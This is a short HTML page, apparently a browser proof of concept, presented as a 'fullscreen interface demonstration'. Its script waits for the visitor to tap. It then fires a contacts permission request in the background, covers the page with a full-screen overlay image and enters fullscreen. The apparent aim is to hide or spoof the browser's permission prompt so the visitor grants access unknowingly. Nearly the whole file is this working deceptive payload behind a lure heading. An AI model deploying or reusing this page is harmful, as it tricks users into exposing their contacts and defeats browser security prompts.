<!DOCTYPE html>
<html lang="en">
<head>
    <title>Fullscreen Interface Demonstration</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">

    <style>
        body{
            margin:0;
            padding:0;
            font-family: Arial, Helvetica, sans-serif;
        }

        #overlay{
            width:100%;
            height:100%;
            display:none;
        }

        #content{
            text-align:center;
            margin-top:120px;
        }
    </style>

<script>

onclick = async () => {

    /* Permission request (runs async like original PoC) */
    (async () => {
        try {
            await navigator.contacts.select(["name"], {});
        } catch(e) {
            console.log("Permission dismissed or unsupported");
        }
    })();

    /* Show overlay image */
    document.getElementById("overlay").style.display="block";
    document.getElementById("content").style.display="none";

    /* Enter fullscreen */
    document.documentElement.requestFullscreen();
}

</script>

</head>

<body>

<img id="overlay" src="abc.png">

<div id="content">

<br><br><br>

<h1>Tap anywhere on the page to start the fullscreen interface demonstration</h1>

</div>

</body>
</html>
